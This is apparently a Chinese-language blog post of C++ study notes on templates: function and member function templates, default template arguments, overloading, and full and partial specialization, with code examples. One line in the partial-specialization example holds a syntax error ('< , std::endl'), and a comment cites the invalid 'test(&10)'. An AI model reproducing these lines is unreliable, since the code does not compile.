<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"><span class="keyword">namespace</span> mystd</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> iter_type ,<span class="keyword">typename</span> func_type&gt;<span class="comment">//普通函数模板</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">for_each</span><span class="params">(iter_type first, iter_type last, func_type func)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> iter = first; iter != last; ++iter)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">func</span>(*iter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	std::vector&lt;<span class="type">int</span>&gt; ivec&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">	mystd::for_each(ivec.<span class="built_in">begin</span>(), ivec.<span class="built_in">end</span>(), [](<span class="type">int</span>&amp; elem) &#123;</span><br><span class="line">		++elem;</span><br><span class="line">		&#125;);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> elem : ivec)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>在现代C++中，函数模板一直普遍使用，一定要掌握。</strong></p>
<p> 2.成员函数模板</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mystd</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> iter_type, <span class="keyword">typename</span> func_type&gt;</span></span><br><span class="line"><span class="function">	<span class="type">void</span> <span class="title">for_each</span><span class="params">(iter_type first, iter_type last, func_type func)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> iter = first; iter != last; ++iter)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">func</span>(*iter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//成员函数模板</span></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">MyVector</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span></span><br><span class="line"><span class="function">		<span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> T2&amp; elem)</span></span>;</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line">	<span class="type">void</span> MyVector&lt;T&gt;::<span class="built_in">outPut</span>(<span class="type">const</span> T2&amp; elem)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	mystd::MyVector&lt;<span class="type">int</span>&gt; myVec;</span><br><span class="line">	myVec.<span class="built_in">outPut</span>&lt;<span class="type">int</span>&gt;(<span class="number">20</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<p>成员函数模板使用情况也不少，需要掌握的</p>
<h2 id="默认模板参数"><a href="#默认模板参数" class="headerlink" title="(*)默认模板参数"></a>(*)默认模板参数</h2><p>默认模板参数：</p>
<p>(1) 默认模板参数是一个经常使用的特性，比如在定义vector对象时，我们就可以使用		默认分配器。</p>
<img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图 2023-03-29 135107.png">

<p>(2) 模板参数就和普通函数的默认参数一样，一旦一个参数有了默认参数，它之后的参	  数都必须有默认参数</p>
<p>(3) 函数模板使用默认模板参数</p>
<p>(2) 类模板使用模板参数</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mystd</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> void_int_func_type = std::function&lt;<span class="built_in">void</span>(<span class="type">int</span>&amp;)&gt;;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> iter_type, <span class="keyword">typename</span> func_type=void_int_func_type&gt;<span class="comment">//函数模板使用模板参数,typename这里有默认值，下边都要有默认值</span></span><br><span class="line">	<span class="type">void</span> for_each(iter_type first, iter_type last, func_type func = [](<span class="type">int</span>&amp; elem)&#123;</span><br><span class="line">			++elem;</span><br><span class="line">		&#125;)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> iter = first; iter != last; ++iter)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">func</span>(*iter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> allocator = std::allocator&lt;T&gt;&gt;<span class="comment">//类模板使用默认模板参数</span></span><br><span class="line">	<span class="keyword">class</span> MyVector</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line">		<span class="type">void</span> <span class="built_in">outPut</span>(<span class="type">const</span> T2&amp; elem);</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span> allocator&gt;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line">	<span class="type">void</span> MyVector&lt;T,allocator&gt;::<span class="built_in">outPut</span>(<span class="type">const</span> T2&amp; elem)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::vector&lt;<span class="type">int</span>&gt; ivec&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">	mystd::for_each(ivec.<span class="built_in">begin</span>(), ivec.<span class="built_in">end</span>());</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> elem : ivec)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>几乎stl库都在使用模板参数</p>
<h2 id="模板的重载，全特化和偏特化"><a href="#模板的重载，全特化和偏特化" class="headerlink" title="(*)模板的重载，全特化和偏特化"></a>(*)模板的重载，全特化和偏特化</h2><p>1.模板的重载</p>
<p>(1) 函数模板是可以重载的（类模板不能被重载），通过重载可以应对更加复杂的情况。比如在处理char<em>和string对象时，虽然都可以代表字符串，但char</em>在复制时直接拷贝内存效率明显更高，string就不得不依次调用构造函数了。所以在一些比较最求效率的程序中对不同的类型进行不同的处理还是非常有意义的。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">const</span> T&amp; parm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;void test(const T&amp; parm)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(T* parm)</span><span class="comment">//若加上const，test(&amp;10)则会调用第一个</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;void test（T* parm)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">double</span> parm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;void test(double parm)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">test</span>(&amp;i);</span><br><span class="line">	<span class="built_in">test</span>(<span class="number">2.2</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">void <span class="built_in">test</span>(const T&amp; parm)</span><br><span class="line">void <span class="built_in">test</span>（T* parm)</span><br><span class="line">void <span class="built_in">test</span>(double parm)</span><br></pre></td></tr></table></figure>



<p>其实函数模板的重载和普通函数的重载没有什么区别。</p>
<p>2.模板的特化</p>
<p>(1) 模板特化的意义：函数模板可以重载以应对更加精细的情况。类模板不能重载，但可以特化来实现类似的功能。</p>
<p>(2) 模板的特化也分为两种，全特化和偏特化。模板的全特化：就是指模板的实参列表与与相应的模板参数列表一一对应。</p>
<p>(3) 模板的偏特化：偏特化就是介于普通模板和全特化之间，只存在部分类型明确化，而非将模板唯一化。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;common template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&lt;T1*, T2*&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;point semi-template&quot;</span> &lt; , std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&lt;<span class="type">int</span>, T2&gt;<span class="comment">//只写一部分叫偏特化</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;int ssssemi-special&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;int,int complete special&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test&lt;<span class="type">int</span>*, <span class="type">int</span>*&gt; test;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><strong>(4)</strong> <strong>其实对于函数模板来说，特化与重载可以理解为一个东西。</strong></p>
<p> <strong>总结：函数模板的重载，类模板的特化。还是比较重要的知识点，应当掌握，在一些比较复杂的程序中，模板重载与特化是经常使用的。</strong></p>
]]></content>
      <categories>
        <category>c/c++学习笔记</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
</search>
